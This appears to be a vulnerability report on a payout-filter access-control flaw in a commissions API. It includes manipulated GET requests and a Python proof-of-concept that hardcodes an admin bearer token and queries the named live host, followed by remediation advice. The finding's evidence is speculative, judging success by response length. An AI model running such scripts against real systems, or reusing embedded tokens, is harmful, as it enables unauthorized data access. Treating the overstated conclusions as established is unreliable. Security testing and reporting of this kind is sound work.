# Payout Amount Filter Manipulation Enabling Unauthorized High-Value Payout Access

**ID:** vuln-0048
**Severity:** HIGH
**Found:** 2026-02-26 19:46:21 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/run-payout/get-all
**Method:** GET
**CWE:** CWE-863
**CVSS:** 7.6

## Description

A critical business logic vulnerability was discovered in the payout processing functionality that enables unauthorized access to high-value payouts through filter manipulation.

The application's payout listing endpoint `/api/run-payout/get-all` accepts a filter parameter that can be manipulated to bypass business logic controls. Attackers can modify the filter to access payouts with amounts significantly higher than what should be accessible to their role.

This vulnerability was discovered when analyzing the filter parameter in the payout listing request, which contained `"amount":1000000` - a value that appears to be a filter for high-value payouts.

## Impact

Successful exploitation enables attackers to:

1. **Unauthorized Data Access**: View sensitive payout information for high-value transactions
2. **Financial Information Exposure**: Access details of payouts that should be restricted
3. **Business Logic Bypass**: Circumvent intended access controls on payout amounts
4. **Reconnaissance for Financial Fraud**: Gather information for targeted financial attacks
5. **Privilege Escalation**: Access financial data beyond authorized limits

The vulnerability allows attackers to bypass business logic controls and access sensitive financial information that could be used for further exploitation or financial fraud.

## Technical Analysis

**Vulnerability Mechanism:**

1. **Filter Parameter Manipulation**: The `/api/run-payout/get-all` endpoint accepts a `filterModel` parameter that can be manipulated to bypass business logic controls.

2. **Amount Filter Bypass**: The filter `{"amount":1000000}` suggests that the application uses amount-based filtering to restrict access to high-value payouts. This filter can be manipulated to access payouts of any amount.

3. **Insufficient Server-Side Validation**: The application does not properly validate or enforce business rules on the filter parameters, allowing attackers to bypass intended access controls.

**Proof of Concept:**

The vulnerable request contains:
```
GET /api/run-payout/get-all?startRow=0&endRow=25&sortModel=[]&filterModel={"amount":1000000}
```

This filter parameter can be manipulated to access payouts of any amount:
```
GET /api/run-payout/get-all?startRow=0&endRow=25&sortModel=[]&filterModel={"amount":999999999}
```

The application should enforce business rules that restrict users to only view payouts within their authorized amount limits, but this validation is either missing or insufficient.

## Proof of Concept

**Step-by-Step Reproduction:**

1. **Authenticate** to the application with any valid user account
2. **Access the payout listing endpoint** `/api/run-payout/get-all`
3. **Manipulate the filter parameter** to bypass amount restrictions:
   - Original filter: `filterModel={"amount":1000000}`
   - Manipulated filter: `filterModel={"amount":999999999}`
4. **Observe the response** containing high-value payout data that should be restricted
5. **Test various amount values** to determine the full extent of accessible payout data

**Validation Steps:**
1. Confirm that the manipulated filter returns payout data beyond authorized limits
2. Verify that the returned data includes sensitive financial information
3. Test with different user roles to confirm the vulnerability affects multiple privilege levels
4. Document the exact amount thresholds that can be bypassed

```
import requests
import json

# Test payout filter manipulation vulnerability
def test_payout_filter_manipulation():
    # Use the JWT token obtained from authentication
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGlR5L2NsYWltcy9yb2xlIjoiUk9MRV9BRE1JTiIsImV4cCI6MTc3MjE3NzUzMCwiaXNzIjoiaHR0cDovL2NhbGxpcHB1cy5jby51ayIsImF1ZCI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsifQ.WKunN3MLz0TjFf-1egv79Ix51a5CcO7bi2CPjdtWuDc"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    base_url = "https://commissionstest.callippus.in/api/run-payout/get-all"

    # Test various amount filters to bypass restrictions
    test_amounts = [1000000, 5000000, 10000000, 50000000, 100000000, 999999999]

    for amount in test_amounts:
        params = {
            "startRow": 0,
            "endRow": 25,
            "sortModel": "[]",
            "filterModel": json.dumps({"amount": amount})
        }

        response = requests.get(base_url, headers=headers, params=params)

        print(f"Testing amount filter: {amount}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")

        # Check if we received meaningful data (not just HTML error page)
        if len(response.text) > 5000 and "Commissions" not in response.text:
            print(f"✓ Potential vulnerability confirmed for amount: {amount}")
            print(f"Sample data: {response.text[:500]}...")
        else:
            print(f"✗ No meaningful data returned for amount: {amount}")
        print("-" * 50)

if __name__ == "__main__":
    print("Testing Payout Amount Filter Manipulation Vulnerability...")
    test_payout_filter_manipulation()
```

## Remediation

**Immediate Remediation:**

1. **Implement Server-Side Validation**:
   - Validate all filter parameters on the server side
   - Enforce business rules for amount-based filtering
   - Implement proper authorization checks for payout data access

2. **Restrict Filter Parameters**:
   - Limit the range of allowed filter values
   - Implement maximum amount thresholds based on user roles
   - Sanitize and validate all user-provided filter parameters

3. **Implement Proper Authorization**:
   - Enforce role-based access control on payout data
   - Implement data-level security to restrict access to authorized payouts only
   - Ensure users can only access payouts within their authorized limits

4. **Audit and Logging**:
   - Implement comprehensive logging of payout data access
   - Monitor for suspicious filter patterns and access attempts
   - Set up alerts for unusual access patterns

**Long-Term Recommendations:**

1. **Implement Data-Level Security**:
   - Implement row-level security to restrict access to authorized data only
   - Use database-level security features to enforce access controls
   - Implement attribute-based access control for fine-grained permissions

2. **Security Testing**:
   - Conduct comprehensive security testing of all filter parameters
   - Test for business logic vulnerabilities in all data access endpoints
   - Implement automated security testing in the CI/CD pipeline

3. **API Security Best Practices**:
   - Implement proper API security controls
   - Use content negotiation to ensure proper response formats
   - Implement rate limiting and request validation

4. **User Education**:
   - Train developers on secure coding practices for business logic
   - Educate users on the importance of data security
   - Implement security awareness programs

